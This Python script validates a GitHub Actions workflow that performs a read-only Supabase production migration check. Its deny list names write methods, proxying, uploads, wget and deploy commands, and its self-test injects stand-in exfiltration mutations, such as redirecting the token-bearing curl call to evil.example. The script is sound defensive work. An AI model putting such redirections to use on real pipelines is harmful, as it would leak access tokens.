#!/usr/bin/env python3
from __future__ import annotations

from pathlib import Path
import re
import sys

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github" / "workflows" / "sinjira-v25-employment-production.yml"

CHECKOUT = "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803"
SETUP_PYTHON = "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1"
PRODUCTION_URL = "https://api.supabase.com/v1/projects/gpvivleexywljowcqkru/database/migrations"
CONFIRMATION = "VERIFY-SINJIRA-V25-EMPLOYMENT"
TOKEN_REF = "SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}"
MAIN_GUARD = 'test "$GITHUB_REF" = "refs/heads/main"'
CONFIRM_GUARD = f'test "$VERIFY_CONFIRMATION" = "{CONFIRMATION}"'
ALLOWED_USES = {CHECKOUT, SETUP_PYTHON}

CONFIRMATION_INPUT = f'''\
      confirmation:
        description: "Saisir exactement {CONFIRMATION}"
        required: true
        type: string
'''

TOKEN_STEP = f'''\
      - name: Télécharger l'historique Emploi en lecture seule
        shell: bash
        env:
          {TOKEN_REF}
        run: |
          set -euo pipefail
          test -n "${{SUPABASE_ACCESS_TOKEN:-}}"
          curl --proto '=https' --fail-with-body --silent --show-error --request GET \\
            --url "{PRODUCTION_URL}" \\
            --header "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" \\
            --header 'Accept: application/json' \\
            --output "$RUNNER_TEMP/employment-production-migrations.json"
'''


def trigger_block(text: str) -> str:
    start = text.find("on:\n")
    end = text.find("\npermissions:", start + 1)
    return "" if start < 0 or end < 0 else text[start:end]


def step_blocks(text: str) -> list[tuple[str, str]]:
    matches = list(re.finditer(r"(?m)^      - name: (.+)$", text))
    blocks: list[tuple[str, str]] = []
    for index, match in enumerate(matches):
        end = matches[index + 1].start() if index + 1 < len(matches) else len(text)
        blocks.append((match.group(1).strip(), text[match.start():end]))
    return blocks


def exact_line_count(text: str, line: str) -> int:
    return text.splitlines().count(line)


def errors(text: str) -> list[str]:
    out: list[str] = []
    triggers = trigger_block(text)
    if not triggers or "  workflow_dispatch:" not in triggers:
        out.append("workflow_dispatch manuel obligatoire")
    for forbidden_trigger in ("  pull_request:", "  push:", "  schedule:", "  repository_dispatch:"):
        if forbidden_trigger in triggers:
            out.append(f"déclencheur production interdit: {forbidden_trigger.strip()}")

    required = (
        "permissions:\n  contents: read",
        "concurrency:\n  group: sinjira-v25-employment-production-verify\n  cancel-in-progress: false",
        "  verify-employment-v25:",
        "    runs-on: ubuntu-24.04",
        "    timeout-minutes: 15",
        "    environment: production",
        MAIN_GUARD,
        CONFIRM_GUARD,
        f"uses: {CHECKOUT}",
        "          ref: main",
        "          persist-credentials: false",
        f"uses: {SETUP_PYTHON}",
        "          python-version: '3.12.14'",
        "          check-latest: false",
        "EXPECTED_REMOTE_BASELINE: \"20260905131659\"",
        "EXPECTED_REMOTE_BASELINE_NAME: sinjira_v25_conscience_vault_audit_session_index",
        "EXPECTED_EMPLOYMENT_VERSION: \"20260905133130\"",
        "EXPECTED_EMPLOYMENT_NAME: sinjira_v25_employment_foundation",
        "python3 scripts/validate_employment_v25.py",
        "python3 scripts/validate_employment_production_deploy_workflow.py",
        "python3 scripts/validate_production_schema_manifest.py",
        'MIGRATION_HISTORY="$RUNNER_TEMP/employment-production-migrations.json" python3 - <<\'PY\'',
        "if observed != employment:",
        "if len(matches) != 1:",
        "Vérification Emploi V25 terminée en lecture seule.",
        "Aucune migration, aucune Edge Function et aucun secret n'ont été modifiés",
        "Emploi reste séparé du Registre personnel",
    )
    for marker in required:
        if marker not in text:
            out.append(f"marqueur obligatoire absent: {marker}")

    if CONFIRMATION_INPUT not in text:
        out.append("l'input de confirmation doit rester requis, typé string et exact")

    for forbidden in (
        "ubuntu-latest",
        "contents: write",
        "persist-credentials: true",
        "SUPABASE_PROJECT_REF",
        "SUPABASE_MANAGEMENT_API",
        "SUPABASE_DB_PASSWORD",
        "supabase/setup-cli@",
        "supabase link",
        "supabase db push",
        "supabase migration repair",
        "supabase functions deploy",
        "supabase secrets set",
        "service_role",
        "SERVICE_ROLE",
        "--linked",
        "--no-verify-jwt",
        "continue-on-error:",
        "set -x",
        "curl -X POST",
        "curl --request POST",
        "curl -X PUT",
        "curl --request PUT",
        "curl -X PATCH",
        "curl --request PATCH",
        "curl -X DELETE",
        "curl --request DELETE",
        "--location",
        "--proxy",
        "--connect-to",
        "--resolve",
        "--upload-file",
        "--data ",
        "--data=",
        "--data-binary",
        "--form ",
        "${{ github.token }}",
        "GITHUB_TOKEN:",
        "GH_TOKEN:",
        "gh api",
        "git push",
        "\nwget ",
        "\n          wget ",
    ):
        if forbidden in text:
            out.append(f"capacité interdite détectée: {forbidden.strip()}")

    if text.count("    runs-on:") != 1:
        out.append("exactement un job de vérification production est autorisé")
    if exact_line_count(text, "    environment: production") != 1:
        out.append("environment: production doit être porté exactement par le job de vérification")
    if exact_line_count(text, "          ref: main") != 1:
        out.append("checkout doit contenir exactement un ref: main")
    if exact_line_count(text, "          persist-credentials: false") != 1:
        out.append("checkout doit désactiver les credentials exactement une fois")

    uses = re.findall(r"(?m)^\s*uses:\s*([^\s#]+)", text)
    unexpected = [value for value in uses if value not in ALLOWED_USES]
    if unexpected:
        out.append("action réutilisable non autorisée/non épinglée: " + ", ".join(unexpected))
    if uses.count(CHECKOUT) != 1 or uses.count(SETUP_PYTHON) != 1:
        out.append("checkout et setup-python doivent chacun apparaître exactement une fois")

    blocks = dict(step_blocks(text))
    checkout = blocks.get("Checkout de main", "")
    if not checkout:
        out.append("étape Checkout de main absente")
    else:
        ref_lines = [line.strip() for line in checkout.splitlines() if line.strip().startswith("ref:")]
        if ref_lines != ["ref: main"]:
            out.append("checkout doit forcer uniquement ref: main")
        if "persist-credentials: false" not in checkout:
            out.append("checkout doit désactiver persist-credentials")
        if "secrets." in checkout or "github.token" in checkout:
            out.append("aucun secret/token ne doit être exposé à checkout")

    secret_lines = [line for line in text.splitlines() if "${{ secrets." in line]
    if secret_lines != [f"          {TOKEN_REF}"]:
        out.append("SUPABASE_ACCESS_TOKEN doit être l'unique secret et rester borné à une seule env d'étape")

    token_block = blocks.get("Télécharger l'historique Emploi en lecture seule", "")
    if not token_block:
        out.append("étape de lecture distante bornée absente")
    elif token_block.strip() != TOKEN_STEP.strip():
        out.append("l'étape portant SUPABASE_ACCESS_TOKEN doit rester exactement bornée au GET HTTPS Supabase autorisé")

    parse_block = blocks.get("Vérifier l'historique Emploi sans secret", "")
    if not parse_block:
        out.append("étape de vérification historique sans secret absente")
    else:
        if "secrets." in parse_block or "SUPABASE_ACCESS_TOKEN" in parse_block or "github.token" in parse_block:
            out.append("le parsing de l'historique doit rester séparé de tout secret/token")
        if 'MIGRATION_HISTORY="$RUNNER_TEMP/employment-production-migrations.json"' not in parse_block:
            out.append("le parsing doit consommer uniquement le fichier temporaire produit par le GET borné")

    main_at = text.find(MAIN_GUARD)
    confirm_at = text.find(CONFIRM_GUARD)
    token_at = text.find("secrets.SUPABASE_ACCESS_TOKEN")
    if min(main_at, confirm_at, token_at) < 0 or not main_at < confirm_at < token_at:
        out.append("les gardes main puis confirmation humaine doivent précéder l'unique accès au secret")

    curl_lines = re.findall(r"(?m)^\s*curl\b.*$", text)
    if len(curl_lines) != 1:
        out.append("un seul appel curl est autorisé dans tout le workflow")
    if text.count(PRODUCTION_URL) != 1:
        out.append("l'URL production Supabase autorisée doit apparaître exactement une fois")

    contracts_at = text.find("Vérifier les contrats Emploi")
    download_at = text.find("Télécharger l'historique Emploi en lecture seule")
    parse_at = text.find("Vérifier l'historique Emploi sans secret")
    summary_at = text.find("Résumé lecture seule")
    if min(contracts_at, download_at, parse_at, summary_at) < 0 or not contracts_at < download_at < parse_at < summary_at:
        out.append("ordre obligatoire: contrats locaux → GET distant → parsing sans secret → résumé")

    return out


def validate(text: str) -> None:
    found = errors(text)
    if found:
        raise ValueError("; ".join(found))


def self_test(text: str) -> None:
    mutations = [
        ("runner mutable", text.replace("runs-on: ubuntu-24.04", "runs-on: ubuntu-latest", 1)),
        ("runner supplémentaire", text + "\n    runs-on: ubuntu-24.04\n"),
        ("checkout mutable", text.replace(CHECKOUT, "actions/checkout@v6", 1)),
        ("python mutable", text.replace(SETUP_PYTHON, "actions/setup-python@v6", 1)),
        ("python large", text.replace("python-version: '3.12.14'", "python-version: '3.x'", 1)),
        ("python latest", text.replace("check-latest: false", "check-latest: true", 1)),
        ("action inconnue", text + "\n      uses: owner/action@v1\n"),
        ("git write", text.replace("contents: read", "contents: write", 1)),
        ("credentials persistés", text.replace("persist-credentials: false", "persist-credentials: true", 1)),
        ("push trigger", text.replace("  workflow_dispatch:", "  push:\n    branches: [main]\n  workflow_dispatch:", 1)),
        ("schedule trigger", text.replace("  workflow_dispatch:", "  schedule:\n    - cron: '0 0 * * *'\n  workflow_dispatch:", 1)),
        ("main guard retiré", text.replace(MAIN_GUARD, "true", 1)),
        ("confirmation retirée", text.replace(CONFIRM_GUARD, "true", 1)),
        ("confirmation changée", text.replace(CONFIRMATION, "VERIFY-OTHER", 1)),
        ("confirmation non requise", text.replace("        required: true", "        required: false", 1)),
        ("checkout autre ref", text.replace("          ref: main", "          ref: develop", 1)),
        ("environnement retiré", text.replace("    environment: production", "    environment: staging", 1)),
        ("timeout élargi", text.replace("    timeout-minutes: 15", "    timeout-minutes: 60", 1)),
        ("secret job-level", text.replace("          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}", "      SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}", 1)),
        ("secret dupliqué", text.replace("      - name: Vérifier l'historique Emploi sans secret", "      - name: Vérifier l'historique Emploi sans secret\n        env:\n          X: ${{ secrets.OTHER_SECRET }}", 1)),
        ("host exfiltration", text.replace("https://api.supabase.com", "https://evil.example", 1)),
        ("projet altéré", text.replace("gpvivleexywljowcqkru", "aaaaaaaaaaaaaaaaaaaa", 1)),
        ("méthode POST", text.replace("--request GET ", "--request POST ", 1)),
        ("méthode DELETE", text.replace("--request GET ", "--request DELETE ", 1)),
        ("retirer https only", text.replace("--proto '=https' ", "", 1)),
        ("redirect", text.replace("--request GET ", "--request GET --location ", 1)),
        ("data", text.replace("--request GET ", "--request GET --data @payload ", 1)),
        ("upload", text.replace("--request GET ", "--request GET --upload-file payload ", 1)),
        ("proxy", text.replace("--request GET ", "--request GET --proxy https://evil.example ", 1)),
        ("connect-to", text.replace("--request GET ", "--request GET --connect-to api.supabase.com:443:evil.example:443 ", 1)),
        ("resolve", text.replace("--request GET ", "--request GET --resolve api.supabase.com:443:127.0.0.1 ", 1)),
        ("second curl", text.replace('test -n "${SUPABASE_ACCESS_TOKEN:-}"', 'test -n "${SUPABASE_ACCESS_TOKEN:-}"\n          curl https://evil.example', 1)),
        ("python dans étape secret", text.replace('test -n "${SUPABASE_ACCESS_TOKEN:-}"', 'test -n "${SUPABASE_ACCESS_TOKEN:-}"\n          python3 -c "print(1)"', 1)),
        ("secret dans parsing", text.replace("      - name: Vérifier l'historique Emploi sans secret", "      - name: Vérifier l'historique Emploi sans secret\n        env:\n          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}", 1)),
        ("variable management api", text.replace("env:\n  EXPECTED_REMOTE_BASELINE", "env:\n  SUPABASE_MANAGEMENT_API: https://evil.example\n  EXPECTED_REMOTE_BASELINE", 1)),
        ("variable project ref", text.replace("env:\n  EXPECTED_REMOTE_BASELINE", "env:\n  SUPABASE_PROJECT_REF: gpvivleexywljowcqkru\n  EXPECTED_REMOTE_BASELINE", 1)),
        ("db password", text + "\n# SUPABASE_DB_PASSWORD\n"),
        ("db push", text + "\n# supabase db push --linked\n"),
        ("deploy", text + "\n# supabase functions deploy employment\n"),
        ("secret write", text + "\n# supabase secrets set X=Y\n"),
        ("migration repair", text + "\n# supabase migration repair\n"),
        ("jwt bypass", text + "\n# --no-verify-jwt\n"),
        ("service role", text + "\n# service_role\n"),
        ("github token", text + "\n# ${{ github.token }}\n"),
        ("gh api", text + "\n# gh api /repos/x/y\n"),
        ("git push", text + "\n# git push origin main\n"),
        ("continue on error", text + "\n    continue-on-error: true\n"),
        ("shell trace", text.replace("set -euo pipefail", "set -x", 1)),
        ("validateur emploi retiré", text.replace("python3 scripts/validate_employment_v25.py", "python3 -V", 1)),
        ("validateur workflow retiré", text.replace("python3 scripts/validate_employment_production_deploy_workflow.py", "python3 -V", 1)),
        ("manifest retiré", text.replace("python3 scripts/validate_production_schema_manifest.py", "python3 -V", 1)),
        ("baseline version changée", text.replace('EXPECTED_REMOTE_BASELINE: "20260905131659"', 'EXPECTED_REMOTE_BASELINE: "0"', 1)),
        ("emploi version changée", text.replace('EXPECTED_EMPLOYMENT_VERSION: "20260905133130"', 'EXPECTED_EMPLOYMENT_VERSION: "0"', 1)),
        ("résumé retiré", text.replace("Vérification Emploi V25 terminée en lecture seule.", "Vérification terminée.", 1)),
    ]

    missed: list[str] = []
    for name, mutated in mutations:
        if mutated == text:
            missed.append(f"{name} (mutation sans effet)")
            continue
        try:
            validate(mutated)
        except ValueError:
            continue
        missed.append(name)
    if missed:
        raise ValueError("mutations non détectées: " + ", ".join(missed))
    print(f"OK: {len(mutations)}/{len(mutations)} mutations critiques détectées")


def main() -> int:
    if not WORKFLOW.is_file():
        print(f"ECHEC: workflow absent: {WORKFLOW.relative_to(ROOT)}", file=sys.stderr)
        return 1
    text = WORKFLOW.read_text(encoding="utf-8")
    try:
        validate(text)
        if "--self-test" in sys.argv:
            self_test(text)
        else:
            print(
                "OK CI production Emploi: lancement manuel main-only, actions/runtimes immuables, "
                "secret exposé à une seule étape shell au GET HTTPS Supabase exact et parsing séparé sans secret."
            )
    except ValueError as exc:
        print(f"ECHEC CI production Emploi: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
